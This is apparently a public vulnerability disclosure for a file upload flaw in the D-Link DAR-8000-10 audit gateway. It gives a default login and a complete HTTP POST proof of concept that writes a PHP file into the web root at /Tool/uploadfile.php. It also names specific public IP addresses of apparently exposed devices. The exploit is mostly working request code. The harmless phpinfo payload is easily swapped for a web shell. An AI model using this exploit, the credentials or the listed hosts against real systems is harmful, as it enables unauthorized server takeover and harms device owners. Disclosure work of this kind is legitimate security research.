The full version of the D-LINK DAR-8000-10 series online behavior audit gateway has a file upload vulnerability. Attackers can exploit vulnerabilities to gain server privileges or cause business impact on the system.

official： http://www.dlink.com.cn/

version:DAR-8000-10

Vulnerability Path ：/Tool/uploadfile.php

Ip：https://59.60.19.174:8443/

Log in to the system using the default password：test/admin@123

POC：

```
POST /Tool/uploadfile.php? HTTP/1.1
Host: 
Cookie: PHPSESSID=25c62fc086a2f7777b8e0dd04d2a75d1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------886123294864872782496578758
Content-Length: 391
Origin: https://113.140.35.82:8443
Referer: https://113.140.35.82:8443/Tool/uploadfile.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------886123294864872782496578758
Content-Disposition: form-data; name="file_upload"; filename="phpinfo.php"
Content-Type: application/octet-stream

<?php phpinfo()?>
-----------------------------886123294864872782496578758
Content-Disposition: form-data; name="txt_path"

/usr/hddocs/nsg/home/2.php
-----------------------------886123294864872782496578758—
```

<img width="724" alt="图片" src="https://github.com/llixixi/cve/assets/144869546/d06a40ea-9ffb-4fa2-9719-acf14fa1f580">

https://59.60.19.174:8443/home/2.php

<img width="716" alt="图片" src="https://github.com/llixixi/cve/assets/144869546/ff6a830e-52cf-4dde-be11-9ad28ac672ca">

